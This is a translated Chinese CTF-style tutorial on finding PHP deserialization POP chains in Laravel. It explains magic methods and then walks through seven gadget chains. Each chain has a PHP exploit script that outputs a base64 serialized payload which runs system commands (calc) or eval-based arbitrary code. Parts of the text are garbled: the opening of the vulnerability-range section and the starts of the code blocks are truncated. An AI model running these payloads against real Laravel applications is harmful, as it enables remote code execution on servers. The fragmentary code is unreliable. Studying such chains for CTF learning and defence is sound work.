# Laravel反序列化漏洞学习及再挖掘
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
做 web 类题目的时候发现 ctfshow 平台中 web 入门题目中有关于`PHP
框架漏洞`的题目，尝试自己挖掘链子，进一步学习在框架类中反序列化的链子挖掘方式。
## 前置知识
###  定义
序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；  
反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用；  
这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性；  
常见的php序列化和反序列化方式主要有：serialize，unserialize
###  常见的魔术方法
    __construct()，类的构造函数
    __destruct()，类的析构函数
    __call()，在对象中调用一个不可访问方法时调用
    __callStatic()，用静态方式中调用一个不可访问方法时调用
    __get()，获得一个类的成员变量时调用
    __set()，设置一个类的成员变量时调用
    __isset()，当对不可访问属性调用isset()或empty()时调用
    __unset()，当对不可访问属性调用unset()时被调用
    __sleep()，执行serialize()时，先会调用这个函数
    __wakeup()，执行unserialize()时，先会调用这个函数
    __toString()，类被当成字符串时的回应方法
    __invoke()，调用函数的方式调用一个对象时的回应方法
    __set_state()，调用var_export()导出类时，此静态方法会被调用
    __clone()，当对象复制完成时调用
    __autoload()，尝试加载未定义的类
    __debugInfo()，打印所需调试信息
###  寻找方式
寻找反序列化链子的常用思路是全局搜索`__destruct()`方法、`__wakeup()`方法或者直接搜索 `unserialize()`方法
## 漏洞范围
Laravel files = array("C:/Tools/phpstudy_pro/WWW/laravel51/public/info.php");
            }
        }
        echo base64_encode(serialize(new WindowsPipes()));
    }
    ?>
###  POP链-2
跟进`src/Illuminate/Broadcasting/PendingBroadcast.php`中的`__destruct()`方法，发现`$this->events`和`$this->event`都是可控的，因此可以寻找一个`__call()`方法或者`dispatch()`方法来进行利用
先用`__call()`来做突破点，跟进`src/Faker/Generator.php`中的`__call()`方法，发现其调用了`format()`方法，进而调用`getFormatter()`方法
由于`getFormatter()`方法中的`$this->formatters[$formatter]`是可控的并直接 return
回上一层，因此可以利用该可控参数来进行命令执行 RCE 操作
**exp**
    events = $events;
                $this->event = $event;
            }
        }
    }
    namespace Faker {
        class Generator {
            protected $formatters = array();
            function __construct($func="") {
                $this->formatters = ['dispatch' => $func];
            }
        }
    }
    namespace {
        $demo1 =  new Faker\Generator("system");
        $demo2 = new Illuminate\Broadcasting\PendingBroadcast($demo1, "calc");
        echo base64_encode(serialize($demo2));
    }
    ?>
**POP链利用流程图**
###  POP链-3
继续上面寻找可用的`__call()`方法，跟进`src/Illuminate/Validation/Validator.php`中的`__call()`方法，先进行字符串的操作截取`$method`第八个字符之后的字符，由于传入的字符串是`dispatch`，正好八个字符所以传入后为空，接着经过
if 逻辑调用`callExtension()`方法，触发`call_user_func_array`方法
**exp**
    extensions = ['' => 'system'];
           }
        }
    }
    namespace Illuminate\Broadcasting {
        use  Illuminate\Validation\Validator;
        class PendingBroadcast {
            protected $events;
            protected $event;
            public function __construct($cmd)
            {
                $this->events = new Validator();
                $this->event = $cmd;
            }
        }
        echo base64_encode(serialize(new PendingBroadcast('calc')));
    }
    ?>
**POP链利用流程图**
###  POP链-4
跟进`src/Illuminate/Support/Manager.php`中的`__call()`方法，其调用`driver()`方法
跟进`createDriver()`方法，当`$this->customCreators[$driver]`存在时调用`callCustomCreator()`方法，进一步跟进`callCustomCreator()`方法，发现`$this->customCreators[$driver]`和`$this->app)`均是可控的，因此可以触发
RCE
**exp**
    app = 'calc';
                $this->defaultChannel = 'H3rmesk1t';
                $this->customCreators = ['H3rmesk1t' => 'system'];
            }
        }
    }
    namespace Illuminate\Broadcasting {
        use  Illuminate\Notifications\ChannelManager;
        class PendingBroadcast {
            protected $events;
            public function __construct()
            {
                $this->events = new ChannelManager();
            }
        }
        echo base64_encode(serialize(new PendingBroadcast()));
    }
    ?>
**POP链利用流程图**
###  POP链-5
大致看了一遍`__call()`方法基本没有利用的地方了(太菜了找不到)，开始跟一下`dispath()`方法
先跟进`src/Illuminate/Events/Dispatcher.php`中的`dispatch()`方法，注意到`$listener($event,
$payload)`，尝试以这个为突破口来实现 RCE
看看`$listener`的值是如何来的，跟进`getListeners()`方法，这里可以先通过可控变量`$this->listeners[$eventName]`来控制`$listener`的值，接着进入数组合并函数，调用`getWildcardListeners()`方法，跟进去看一下，这里保持默认设置执行完之后会返回`$wildcards
=
[]`，接着回到数组合并函数合并之后还是`$this->listeners[$eventName]`的值，接着进入`class_exists()`函数，这里由于并不会存在一个命令执行函数的类名，因此可以依旧还是返回`$this->listeners[$eventName]`的值
控制了`$listener`的取值之后，将传入的`$event`的值作为命令执行函数的参数值即可来进行 RCE 操作
**exp**
    listeners = ["calc" => ["system"]];
            }
        }
    }
    namespace Illuminate\Broadcasting {
        use  Illuminate\Events\Dispatcher;
        class PendingBroadcast {
            protected $events;
            protected $event;
            public function __construct() {
                $this->events = new Dispatcher();
                $this->event = "calc";
            }
        }
        echo base64_encode(serialize(new PendingBroadcast()));
    }
    ?>
**POP链利用流程图**
###  POP链-6
继续跟`dispatch()`方法，跟进`src/Illuminate/Bus/Dispatcher.php`中的`dispatch()`方法，注意到该方法如果
if 语句判断为 true
的话，会进入`dispatchToQueue()`方法，跟进`dispatchToQueue()`方法发现`call_user_func()`方法
先看看怎么使得进入 if
语句的循环中，首先`$this->queueResolver`是可控的，跟进`commandShouldBeQueued()`方法，这里判断`$command`是否是`ShouldQueue`的实现，即传入的`$command`必须是`ShouldQueue`接口的一个实现，而且`$command`类中包含`connection`属性
这里找到两个符合条件的类`src/Illuminate/Notifications/SendQueuedNotifications.php`中的`SendQueuedNotifications`类和`src/Illuminate/Broadcasting/BroadcastEvent.php`中的`BroadcastEvent`类，当类是
use 了 trait 类，同样可以访问其属性，这里跟进`src/Illuminate/Bus/Queueable.php`
**exp**
    event = "calc";
                $this->connection = $this->event;
            }
        }
        class PendingBroadcast {
            protected $events;
            protected $event;
            public function __construct() {
                $this->events = new Dispatcher();
                $this->event = new BroadcastEvent();
            }
        }
        echo base64_encode(serialize(new PendingBroadcast()));
    }
    ?>
**POP链利用流程图**
###  POP链-7
继续接着上一条链子的`call_user_func()`方法往后，由于这里变量是可控的，因此可以调用任意类的方法，跟进`library/Mockery/Loader/EvalLoader.php`中的`load()`方法，这里如果不进入
if 循环从而触发到`getCode()`方法即可造成任意代码执行漏洞
看看 if
循环的判断条件，一路跟进调用，由于最后的`$this->name`是可控的，因此只需要给它赋一个不存在的类名值即可，可利用的`getName()`方法比较多，选一个能用的就行
**exp-1**
    config = new MockConfiguration();
                $this->code = "";
            }
        }
    }
    namespace Mockery\Loader {
        class EvalLoader {}
    }
    namespace Illuminate\Bus {
        use Mockery\Loader\EvalLoader;
        class Dispatcher {
            protected $queueResolver;
            public function __construct() {
                $this->queueResolver = [new EvalLoader(), 'load'];
            }
        }
    }
    namespace Illuminate\Broadcasting {
        use Illuminate\Bus\Dispatcher;
        use Mockery\Generator\MockDefinition;
        class BroadcastEvent {
            public $connection;
            public function __construct() {
                $this->connection = new MockDefinition();
            }
        }
        class PendingBroadcast {
            protected $events;
            protected $event;
            public function __construct() {
                $this->events = new Dispatcher();
                $this->event = new BroadcastEvent();
            }
        }
        echo base64_encode(serialize(new PendingBroadcast()));
    }
    ?>
**exp-2**
    <?php
    namespace Symfony\Component\HttpFoundation {
        class Cookie {
            protected $name = "H3rmesk1t";
        }